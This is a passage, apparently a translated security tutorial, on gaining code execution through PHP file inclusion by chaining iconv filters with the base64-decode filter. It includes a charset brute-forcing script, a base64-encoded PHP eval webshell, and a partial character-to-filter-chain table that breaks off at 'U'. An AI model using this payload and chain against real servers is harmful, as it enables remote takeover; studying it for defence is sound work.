# LFI In PHP Base64 Filter

# Preface

In `PHP`, you can use the loose parsing of `PHP Base64 Filter` and combine `iconv filter` and other encoding combinations to construct specific `PHP` codes to complete `RCE` without temporary files without `simple files`.

However, it should be noted that this type of `tips` will be restricted by `iconv`. If the system does not have `iconv` or different `iconv` versions, it will have different performances.

# analyze

The characteristics of `PHP Base64 Filter` have already appeared in the bypass method of death exit proposed by `PNO. For `PHP Base64 Filter`, abnormally encoded characters will be ignored during the decoding process, such as `<?php exit; ?>`. When decoding using `php://filter/write=convert.base64-decode`, the characters `<`, `?`, ``, `` and `` are not in the character range encoded by `base64 (`A-Za-z0-9\/\=\+`), and will be automatically ignored. Therefore, the characters that are finally decoded are `phpexit` and other decodeable characters passed in subsequently.

In PHP Filter there is a `convert.iconv`Filter` of `convert.iconv`, which can be used to convert data from character set `A` to character set `B`, where these two character sets can be obtained from `iconv -l`

![Untitled](LFI%20In%20PHP%20Base64%20Filter%2018b41d18fde549a9ac96c69a840c4eca/Untitled.png)

In the example code, using `iconv` to convert the `UTF-8` character set to `UTF-7` character set. Combined with the `PHP Base64 Filter` feature, you can use some fixed file content to construct the required content.

```php
<?php

$url = "php://filter/";
$url .= "convert.iconv.UTF-8.UTF-7/";
$url .= "resource=data:,some!!!text";

echo file_get_contents($url);

// some+ACEAIQAh-text
```

Assuming that the content of the file is `aaaaaaaaaaaaa`, brute force traversing the character encoding method supported by `iconv`, use `convert.base64-decode` to remove the generated invisible characters, and then use `convert.base64-encode` to restore the visible characters to try to obtain the required content

It can be seen that through violent traversal, `Fuzz` successfully to character `C`

```php
<?php

$iconv_array = array("437", "500", "500V1", "850", "851", "852", "855", "856", "857", "858", "860", "861", "862", "863", "864", "865", "866", "866NAV", "869", "874", "904", "1026", "1046", "1047", "8859_1", "8859_2", "8859_3", "8859_4", "8859_5", "8859_6", "8859_7", "8859_8", "8859_9", "10646-1:1993", "10646-1:1993/UCS4", "ANSI_X3.4-1968", "ANSI_X3.4-1986", "ANSI_X3.4", "ANSI_X3.110-1983", "ANSI_X3.110", "ARABIC", "ARABIC7", "ARMSCII-8", "ARMSCII8", "ASCII", "ASMO-708", "ASMO_449", "BALTIC", "BIG-5", "BIG-FIVE", "BIG5-HKSCS", "BIG5", "BIG5HKSCS", "BIGFIVE", "BRF", "BS_4730", "CA", "CN-BIG5", "CN-GB", "CN", "CP-AR", "CP-GR", "CP-HU", "CP037", "CP038", "CP273", "CP274", "CP275", "CP278", "CP280", "CP281", "CP282", "CP284", "CP285", "CP290", "CP297", "CP367", "CP420", "CP423", "CP424", "CP437", "CP500", "CP737", "CP770", "CP771", "CP772", "CP773", "CP774", "CP775", "CP803", "CP813", "CP819", "CP850", "CP851", "CP852", "CP855", "CP856", "CP857", "CP858", "CP860", "CP861", "CP862", "CP863", "CP864", "CP865", "CP866NAV", "CP868", "CP869", "CP870", "CP871", "CP874", "CP875", "CP880", "CP891", "CP901", "CP902", "CP903", "CP904", "CP905", "CP912", "CP915", "CP916", "CP918", "CP920", "CP921", "CP922", "CP930", "CP932", "CP933", "CP935", "CP936", "CP937", "CP939", "CP949", "CP950", "CP1004", "CP1008", "CP1025", "CP1026", "CP1046", "CP1047", "CP1070", "CP1079", "CP1081", "CP1084", "CP1089", "CP1097", "CP1112", "CP1122", "CP1123", "CP1124", "CP1125", "CP1129", "CP1130", "CP1132", "CP1133", "CP1137", "CP1140", "CP1141", "CP1142", "CP1143", "CP1144", "CP1145", "CP1146", "CP1147", "CP1148", "CP1149", "CP1153", "CP1154", "CP1155", "CP1156", "CP1157", "CP1158", "CP1160", "CP1161", "CP1162", "CP1163", "CP1164", "CP1166", "CP1167", "CP1250", "CP1251", "CP1252", "CP1253", "CP1254", "CP1255", "CP1256", "CP1257", "CP1258", "CP1282", "CP1361", "CP1364", "CP1371", "CP1388", "CP1390", "CP1399", "CP4517", "CP4899", "CP4909", "CP4971", "CP5347", "CP9030", "CP9066", "CP9448", "CP10007", "CP12712", "CP16804", "CPIBM861", "CSA7-1", "CSA7-2", "CSASCII", "CSA_T500-1983", "CSA_T500", "CSA_Z243.4-1985-1", "CSA_Z243.4-1985-2", "CSA_Z243.419851", "CSA_Z243.419852", "CSDECMCS", "CSEBCDICATDE", "CSEBCDICATDEA", "CSEBCDICCAFR", "CSEBCDICDKNO", "CSEBCDICDKNOA", "CSEBCDICES", "CSEBCDICESA", "CSEBCDICFISE", "CSEBCDICFISEA", "CSEBCDICFR", "CSEBCDICIT", "CSEBCDICPT", "CSEBCDICUK", "CSEBCDICUS", "CSEUCKR", "CSEUCPKDFMTJAPANESE", "CSGB2312", "CSHPROMAN8", "CSIBM037", "CSIBM038", "CSIBM273", "CSIBM274", "CSIBM275", "CSIBM277", "CSIBM278", "CSIBM280", "CSIBM281", "CSIBM284", "CSIBM285", "CSIBM290", "CSIBM297", "CSIBM420", "CSIBM423", "CSIBM424", "CSIBM500", "CSIBM803", "CSIBM851", "CSIBM855", "CSIBM856", "CSIBM857", "CSIBM860", "CSIBM863", "CSIBM864", "CSIBM865", "CSIBM866", "CSIBM868", "CSIBM869", "CSIBM870", "CSIBM871", "CSIBM880", "CSIBM891", "CSIBM901", "CSIBM902", "CSIBM903", "CSI
BM904", "CSIBM905", "CSIBM918", "CSIBM921", "CSIBM922", "CSIBM930", "CSIBM932", "CSIBM933", "CSIBM935", "CSIBM937", "CSIBM939", "CSIBM943", "CSIBM1008", "CSIBM1025", "CSIBM1026", "CSIBM1097", "CSIBM1112, "CSIBM1122", "CSIBM1123", "CSIBM1124", "CSIBM1129", "CSIBM1130", "CSIBM1132", "CSIBM1133", "CSIBM1137", "CSIBM1140", "CSIBM1141", "CSIBM1142", "CSIBM1143", "CSIBM1144", "CSIBM1145", "CSIBM1146", "CSIBM1147", "CSIBM1148", "CSIBM1149", "CSIBM1153", "CSIBM1154", "CSIBM1155", "CSIBM1156", "CSIBM1157", "CSIBM1158", "CSIBM1160", "CSIBM1161", "CSIBM1163", "CSIBM1164", "CSIBM1166", "CSIBM1167", "CSIBM1364", "CSIBM1371", "CSIBM1388", "CSIBM1390", "CSIBM1399", "CSIBM4517", "CSIBM4899", "CSIBM4909", "CSIBM4971", "CSIBM5347", "CSIBM9030", "CSIBM9066", "CSIBM9448", "CSIBM12712", "CSIBM16804", "CSIBM11621162", "CSISO4UNITEDKINGDOM", "CSISO10SWEDISH", "CSISO11SWEDISHFORNAMES", "CSISO14JISC6220RO", "CSISO15ITALIAN", "CSISO16PORTUGESE", "CSISO17SPANISH", "CSISO18GREEK7OLD", "CSISO19LATINGREEK", "CSISO21GERMAN", "CSISO25FRENCH", "CSISO27LATINGREEK1", "CSISO49INIS", "CSISO50INIS8", "CSISO51INISCYRILLIC", "CSISO58GB1988", "CSISO60DANISHNORWEGIAN", "CSISO60NORWEGIAN1", "CSISO61NORWEGIAN2", "CSISO69FRENCH", "CSISO84PORTUGUESE2", "CSISO85SPANISH2", "CSISO86HUNGARIAN", "CSISO88GREEK7", "CSISO89ASMO449", "CSISO90", "CSISO92JISC62991984B", "CSISO99NAPLPS", "CSISO103T618BIT", "CSISO111ECMACYRILLIC", "CSISO121CANADIAN1", "CSISO122CANADIAN2", "CSISO139CSN369103", "CSISO141JUSIB1002", "CSISO143IECP271", "CSISO150", "CSISO150GREEKCCITT", "CSISO151CUBA", "CSISO153GOST1976874", "CSISO646DANISH", "CSISO2022CN", "CSISO2022JP", "CSISO2022JP2", "CSISO2022KR", "CSISO2033", "CSISO5427CYRILLIC", "CSISO5427CYRILLIC1981", "CSISO5428GREEK", "CSISO10367BOX", "CSISOLATIN1", "CSISOLATIN2", "CSISOLATIN3", "CSISOLATIN4", "CSISOLATIN5", "CSISOLATIN6", "CSISOLATINARABIC", "CSISOLATINCYRILLIC", "CSISOLATINGREEK", "CSISOLATINHEBREW", "CSKOI8R", "CSKSC5636", "CSMACINTOSH", "CSNATSDANO", "CSNATSSEFI", "CSN_369103", "CSPC8CODEPAGE437", "CSPC775BALTIC", "CSPC850MULTILINGUAL", "CSPC858MULTILINGUAL", "CSPC862LATINHEBREW", "CSPCP852", "CSSHIFTJIS", "CSUCS4", "CSUNICODE", "CSWINDOWS31J", "CUBA", "CWI-2", "CWI", "CYRILLIC", "DE", "DEC-MCS", "DEC", "DECMCS", "DIN_66003", "DK", "DS2089", "DS_2089", "E13B", "EBCDIC-AT-DE-A", "EBCDIC-AT-DE", "EBCDIC-BE", "EBCDIC-BR", "EBCDIC-CA-FR", "EBCDIC-CP-AR1", "EBCDIC-CP-AR2", "EBCDIC-CP-BE", "EBCDIC-CP-CA", "EBCDIC-CP-CH", "EBCDIC-CP-DK", "EBCDIC-CP-ES", "EBCDIC-CP-FI", "EBCDIC-CP-FR", "EBCDIC-CP-GB", "EBCDIC-CP-GR", "EBCDIC-CP-HE", "EBCDIC-CP-IS", "EBCDIC-CP-IT", "EBCDIC-CP-IT", "EBCDIC-CP-NL", "EBCDIC-CP-NO", "EBCDIC-CP-ROECE", "EBCDIC-CP-SE", "EBCDIC-CP-TR", "EBCDIC-CP-US", "EBCDIC-CP-WT", "EBCDIC-CP-YU", "EBCDIC-CYRILLIC", "EBCDIC-DK-NO-A", "EBCDIC-DK-NO", "EBCDIC-ES-A", "EBCDIC-ES-S", "EBCDIC-ES", "EBCDIC-FI-SE-A", "EBCDIC-FR", "EBCDIC-GREEK", "EBCDIC-INT", "EBCDIC-INT1", "EBCDIC-IS-FRISS", "EBCDIC-IT", "EBCDIC-JP-E", "EBCDIC-JP-KANA", "EBCDIC-PT", "EBCDIC-UK", "EBCDIC-US", "EBCDICATDE", "EBCDICATDEA", "EBCDICCAFR", "EBCDICDKNO", "EBCDICDKNOA", "EBCDICES", "EBCDICESA", "EBCDICESS", "EBCDICFISE", "EBCDICFISEA", "EBCDICFR", "EBCDICISFRISS", "EBCDICIT", "EBCDICPT", "EBCDICUK", "EBCDICUS", "ECMA-114", "ECMA-118", "ECMA-128", "ECMA-CYRILLIC", "ECMACYRILLIC", "ELOT_928", "ES", "ES2", "EUC-CN", "EUC-JISX0213", "EUC-JP-MS", "EUC-JP", "EUC-KR", "EUC-TW", "EUCCN", "EUCJP-MS", "EUCJP-OPEN", "EUCJP-WIN", "EUCJP", "EUCKR", "EUCTW", "FI", "FR", "GB", "GB2312", "GB13000", "GB18030", "GBK", "GB_1988-80", "GB_198880", "GEORGIAN-ACADEMY", "GEORGIAN-PS", "GOST_19768-74", "GOST_19768", "GOST_1976874", "GREEK-CCITT", "GREEK", "GREEK7-OLD", "GREEK7OLD", "GREEK8", "GREEKCCITT", "HEBREW", "HP-GREEK8", "HP-ROMAN8", "HP-ROMAN9", "HP-THAI8", "HP-TURKISH8", "HPGREEK8", "HPROMAN8", "HPROMAN9", "HPTHAI8", "HPTURKISH8", "HU", "IBM-803", "IBM-856", "IBM-901", "IBM-902", "IBM-921", "IBM-922", "IBM-930", "IBM-932", "IBM-933", "IBM-935", "IBM-937", "IBM-939", "IBM-943"
, "IBM-1008", "IBM-1025", "IBM-1046", "IBM-1047", "IBM-1097", "IBM-1112", "IBM-1122", "IBM-1123", "IBM-1124", "IBM-1129", "IBM-1130", "IBM-1132", "IBM-1133", "IBM-1137", "IBM-1140", "IBM-1141", "IBM-1142", "IBM-1143", "IBM-1144", "IBM-1145", "IBM-1146", "IBM-1147", "IBM-1148", "IBM-1149", "IBM-1153", "IBM-1154", "IBM-1155", "IBM-1156", "IBM-1157", "IBM-1158", "IBM-1160", "IBM-1161", "IBM-1162", "IBM-1163", "IBM-1164", "IBM-1166", "IBM-1167", "IBM-1364", "IBM-1371", "IBM-1388", "IBM-1390", "IBM-1399", "IBM-4517", "IBM-4899", "IBM-4909", "IBM-4971", "IBM-5347", "IBM-9030", "IBM-9066", "IBM-9448", "IBM-12712", "IBM-16804", "IBM037", "IBM038", "IBM256", "IBM273", "IBM274", "IBM275", "IBM277", "IBM278", "IBM280", "IBM281", "IBM284", "IBM285", "IBM290", "IBM297", "IBM367", "IBM420", "IBM423", "IBM424", "IBM437", "IBM500", "IBM775", "IBM803", "IBM813", "IBM819", "IBM848", "IBM850", "IBM851", "IBM852", "IBM855", "IBM856", "IBM857", "IBM858", "IBM860", "IBM861", "IBM862", "IBM863", "IBM864", "IBM865", "IBM866NAV", "IBM868", "IBM869", "IBM870", "IBM871", "IBM874", "IBM875", "IBM880", "IBM891", "IBM901", "IBM902", "IBM903", "IBM904", "IBM905", "IBM912", "IBM915", "IBM916", "IBM918", "IBM920", "IBM921", "IBM922", "IBM930", "IBM932", "IBM933", "IBM935", "IBM937", "IBM939", "IBM943", "IBM1004", "IBM1008", "IBM1025", "IBM1026", "IBM1046", "IBM1047", "IBM1089", "IBM1097", "IBM1112", "IBM1122", "IBM1123", "IBM1124", "IBM1129", "IBM1130", "IBM1132", "IBM1133", "IBM1137", "IBM1140", "IBM1141", "IBM1142", "IBM1143", "IBM1144", "IBM1145", "IBM1146", "IBM1147", "IBM1148", "IBM1149", "IBM1153", "IBM1154", "IBM1155", "IBM1156", "IBM1157", "IBM1158", "IBM1160", "IBM1161", "IBM1162", "IBM1163", "IBM1164", "IBM1166", "IBM1167", "IBM1364", "IBM1371", "IBM1388", "IBM1390", "IBM1399", "IBM4517", "IBM4899", "IBM4909", "IBM4971", "IBM5347", "IBM9030", "IBM9066", "IBM9448", "IBM12712", "IBM16804", "IEC_P27-1", "IEC_P271", "INIS-8", "INIS-CYRILLIC", "INIS", "INIS8", "INISCYRILLIC", "ISIRI-3342", "ISIRI3342", "ISO-2022-CN-EXT", "ISO-2022-CN", "ISO-2022-JP-2", "ISO-2022-JP-3", "ISO-2022-JP", "ISO-2022-JP", "ISO-2022-KR", "ISO-8859-1", "ISO-8859-2", "ISO-8859-3", "ISO-8859-4", "ISO-8859-5", "ISO-8859-6", "ISO-8859-7", "ISO-8859-8", "ISO-8859-9", "ISO-8859-9E", "ISO-8859-10", "ISO-8859-11", "ISO-8859-13", "ISO-8859-14", "ISO-8859-15", "ISO-8859-16", "ISO-10646/UCS2", "ISO-10646/UCS4", "ISO-10646/UTF-8", "ISO-10646/UTF8", "ISO-CELTIC", "ISO-IR-4", "ISO-IR-6", "ISO-IR-8-1", "ISO-IR-9-1", "ISO-IR-10", "ISO-IR-11", "ISO-IR-14", "ISO-IR-15", "ISO-IR-16", "ISO-IR-17", "ISO-IR-18", "ISO-IR-19", "ISO-IR-21", "ISO-IR-25", "ISO-IR-27", "ISO-IR-37", "ISO-IR-49", "ISO-IR-50", "ISO-IR-51", "ISO-IR-54", "ISO-IR-55", "ISO-IR-57", "ISO-IR-60", "ISO-IR-61", "ISO-IR-69", "ISO-IR-84", "ISO-IR-85", "ISO-IR-86", "ISO-IR-88", "ISO-IR-89", "ISO-IR-90", "ISO-IR-92", "ISO-IR-98", "ISO-IR-99", "ISO-IR-100", "ISO-IR-101", "ISO-IR-103", "ISO-IR-109", "ISO-IR-110", "ISO-IR-111", "ISO-IR-121", "ISO-IR-122", "ISO-IR-126", "ISO-IR-127", "ISO-IR-138", "ISO-IR-139", "ISO-IR-141", "ISO-IR-143", "ISO-IR-144", "ISO-IR-148", "ISO-IR-150", "ISO-IR-151", "ISO-IR-153", "ISO-IR-155", "ISO-IR-156", "ISO-IR-157", "ISO-IR-166", "ISO-IR-179", "ISO-IR-193", "ISO-IR-197", "ISO-IR-199", "ISO-IR-193", "ISO-IR-199", "ISO-IR-203", "ISO-IR-209", "ISO-IR-226", "ISO/TR_11548-1", "ISO646-CA", "ISO646-CA2", "ISO646-CN", "ISO646-CU", "ISO646-DE", "ISO646-DK", "ISO646-ES", "ISO646-ES2", "ISO646-FI", "ISO646-FR", "ISO646-FR1", "ISO646-GB", "ISO646-HU", "ISO646-IT", "ISO646-JP-OCR-B", "ISO646-JP", "ISO646-KR", "ISO646-NO", "ISO646-NO2", "ISO646-PT", "ISO646-PT2", "ISO646-SE", "ISO646-SE2", "ISO646-US", "ISO646-YU", "ISO2022CN", "ISO2022CNEXT", "ISO2022JP", "ISO2022JP2", "ISO2022KR", "ISO6937", "ISO8859-1", "ISO8859-2", "ISO8859-3", "ISO8859-4", "ISO8859-5", "ISO8859-6", "ISO8859-7", "ISO8859-8", "ISO8859-9", "ISO8859-9E", "ISO8859-10", "ISO8859-11", "ISO8859-13", "ISO8859-14", "ISO8859-15", "ISO8859-16", "ISO11548-1", "ISO88591", "ISO88592", "
ISO88593", "ISO88594", "ISO88595", "ISO88596", "ISO88597", "ISO88598", "ISO88599E", "ISO885910", "ISO885911", "ISO885913", "ISO885914", "ISO885915", "ISO885916", "ISO_646.IRV:1991", "ISO_2033-1983", "ISO_2033", "ISO_5427-EXT", "ISO_5427", "ISO_5427:1981", "ISO_5427EXT", "ISO_5428", "ISO_5428:1980", "ISO_6937-2", "ISO_6937-2:1983", "ISO_6937", "ISO_6937:1992", "ISO_8859-1", "ISO_8859-1:1987", "ISO_8859-2", "ISO_8859-2:1987", "ISO_8859-3", "ISO_8859-3:1988", "ISO_8859-4", "ISO_8859-4:1988", "ISO_8859-5", "ISO_8859-5:1988", "ISO_8859-6", "ISO_8859-6:1987", "ISO_8859-7:1987", "ISO_8859-7:1987", "ISO_8859-7:2003", "ISO_8859-8", "ISO_8859-8:1988", "ISO_8859-9", "ISO_8859-9:1989", "ISO_8859-9E", "ISO_8859-10", "ISO_8859-10:1992", "ISO_8859-14", "ISO_8859-14:1998", "ISO_8859-15", "ISO_8859-15:1998", "ISO_8859-16", "ISO_8859-16:2001", "ISO_9036", "ISO_10367-BOX", "ISO_10367BOX", "ISO_11548-1", "ISO_69372", "IT", "JIS_C6220-1969-RO", "JIS_C6229-1984-B", "JIS_C62201969RO", "JIS_C62291984B", "JOHAB", "JP-OCR-B", "JP", "JS", "JUS_I.B1.002", "KOI-7", "KOI-8", "KOI8-RU", "KOI8-T", "KOI8-U", "KOI8", "KOI8R", "KOI8U", "KSC5636", "L1", "L2", "L3", "L4", "L5", "L6", "L7", "L8", "L10", "LATIN-9", "LATIN-GREEK-1", "LATIN-GREEK", "LATIN1", "LATIN2", "LATIN3", "LATIN4", "LATIN5", "LATIN6", "LATIN7", "LATIN8", "LATIN9", "LATIN10", "LATINGREEK", "LATINGREEK1", "MAC-CENTRALEUROPE", "MAC-CYRILLIC", "MAC-IS", "MAC-SAMI", "MAC-UK", "MAC", "MACCYRILLIC", "MACINTOSH", "MACIS", "MACUK", "MACUKRAINIAN", "MIK", "MS-ANSI", "MS-ARAB", "MS-CYRL", "MS-EE", "MS-GREEK", "MS-HEBR", "MS-MAC-CYRILLIC", "MS-TURK", "MS932", "MS936", "MS949", "MSCP1361", "MSMACCYRILLIC", "MSZ_7795.3", "MS_KANJI", "NAPLPS", "NATS-DANO", "NATS-SEFI", "NATSDANO", "NATSSEFI", "NC_NC0010", "NC_NC00-10:81", "NF_Z_62-010", "NF_Z_62-010_(1973)", "NF_Z_62-010_1973", "NF_Z_62-010_1973", "NF_Z_62010", "NF_Z_62010_1973", "NF_Z_62010_1973", "NO", "NO2", "NS_4551-1", "NS_4551-2", "NS_45511", "NS_45512", "OS2LATIN1", "OSF00010001", "OSF00010002", "OSF00010003", "OSF00010004", "OSF00010005", "OSF00010006", "OSF00010007", "OSF00010008", "OSF00010009", "OSF0001000A", "OSF00010020", "OSF000101000", "OSF00010101", "OSF00010102", "OSF00010104", "OSF00010105", "OSF00010106", "OSF00030010", "OSF0004000A", "OSF0005000A", "OSF05010001", "OSF100201A4", "OSF100201A8", "OSF100201B5", "OSF100201F4", "OSF100203B5", "OSF1002011C", "OSF1002011D", "OSF1002035D", "OSF1002035E", "OSF1002035F", "OSF1002036B", "OSF1002037B", "OSF10010001", "OSF10010004", "OSF10010006", "OSF10020025", "OSF10020111", "OSF10020115", "OSF10020116", "OSF10020118", "OSF10020122", "OSF10020129", "OSF10020352", "OSF10020354", "OSF10020357", "OSF10020359", "OSF10020360", "OSF10020364", "OSF10020365", "OSF10020366", "OSF10020367", "OSF10020370", "OSF10020387", "OSF10020388", "OSF10020396", "OSF10020402", "OSF10020417", "PT", "PT2", "PT154", "R8", "R9", "RK1048", "ROMAN8", "ROMAN9", "RUSCII", "SE", "SE2", "SEN_850200_B", "SEN_850200_C", "SHIFT-JIS", "SHIFTJISX0213", "SHIFT_JIS", "SHIFT_JISX0213", "SJIS-OPEN", "SJIS-WIN", "SJIS", "SS636127", "STRK1048-2002", "ST_SEV_358-88", "T.61-8BIT", "T.61", "T.618BIT", "TCVN-5712", "TCVN", "TCVN5712-1", "TCVN5712-1:1993", "THAI8", "TIS-620", "TIS620.2529-1", "TIS620.2533-0", "TIS620", "TS-5881", "TSCII", "TURKISH8", "UCS-2", "UCS-2BE", "UCS-2LE", "UCS-4", "UCS-4BE", "UCS-4LE", "UCS2", "UCS4", "UHC", "UJIS", "UK", "UNICODE", "UNICODEBIG", "UNICODELITTLE", "US-ASCII", "US", "UTF-7", "UTF-8", "UTF-16", "UTF-16BE", "UTF-16LE", "UTF-32", "UTF-32BE", "UTF-32LE", "UTF7", "UTF8", "UTF16BE", "UTF16LE", "UTF32", "UTF32BE", "UTF32LE", "VISCII", "WCHAR_T", "WIN-SAMI-2", "WINBALTRIM", "WINDOWS-31J", "WINDOWS-874", "WINDOWS-936", "WINDOWS-1250", "WINDOWS-1251", "WINDOWS-1252", "WINDOWS-1253", "WINDOWS-1254", "WINDOWS-1255", "WINDOWS-1256", "WINDOWS-1257", "WINDOWS-1258", "WINSAMI2", "WS2", "YU");

for ($i = 0; $i < count($iconv_array); $i++) {
    $url = "php://filter/convert.iconv.UTF-8.";
    $url .= $iconv_array
[$i];
    $url .= "|convert.base64-decode|convert.base64-encode/resource=data:,hhhhhhhhhhhhh";
    echo "[+] " . $iconv_array[$i] . " ====> ";
    echo file_get_contents($url) . "<br>";
}
?>
```

![Untitled](LFI%20In%20PHP%20Base64%20Filter%2018b41d18fde549a9ac96c69a840c4eca/Untitled%201.png)

Since the character range of `base64` encoded does not contain `<`, `?` and other characters, it is impossible to directly construct the usable `Webshell`. However, you can use the above method to construct a `base64` string, and finally call `convert.base64-decode` for decoding again to use `Webshell`

Therefore, now you only need to use the above encoding techniques to find the base64 string that can construct the Webshell. Here you already have the ready-made Fuzz code: [https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT](https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT)

```php
<?php
$base64_payload = "PD9waHAgZXZhbCgkX0dFVFsxXSk7Pz5h";
$conversions = array(
    "/" => "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4",
    "1" => "convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4",
    "2" => "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921",
    "3" => "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE",
    "4" => "convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE",
    "5" => "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.GBK.UTF-8|convert.iconv.IEC_P27-1.UCS-4LE",
    "6" => "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2",
    "7" => "convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4",
    "8" => "convert.iconv.JS.UTF16|convert.iconv.L6.UTF-16",
    "9" => "convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB",
    "a" => "convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE",
    "b" => "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE",
    "c" => "convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2",
    "d" => "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5",
    "e" => "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937",
    "f" => "convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213",
    "g" => "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8",
    "h" => "convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE",
    "i" => "convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000",
    "j" => "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16",
    "k" => "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2",
    "l" => "convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE",
    "m" => "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949",
    "n" => "convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61",
    "o" => "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE",
    "p" => "convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4",
    "q" => "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2",
    "r" => "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101",
    "s" => "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90",
    "t" => "convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS",
    "u" => "convert.iconv.CP
1162.UTF32|convert.iconv.L4.T.61",
    "v" => "convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO_6937-2:1983.R9|convert.iconv.OSF00010005.IBM-932",
    "w" => "convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE",
    "x" => "convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS",
    "y" => "convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT",
    "z" => "convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937",
    "A" => "convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213",
    "B" => "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000",
    "C" => "convert.iconv.CN.ISO2022KR",
    "D" => "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213",
    "E" => "convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT",
    "F" => "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB",
    "G" => "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90",
    "H" => "convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213",
    "I" => "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213",
    "J" => "convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4",
    "K" => "convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE",
    "L" => "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC",
    "M" => "convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T",
    "N" => "convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4",
    "O" => "convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775",
    "P" => "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB",
    "Q" => "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2",
    "R" => "convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4",
    "S" => "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS",
    "T" => "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103",
    "U" => "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943",
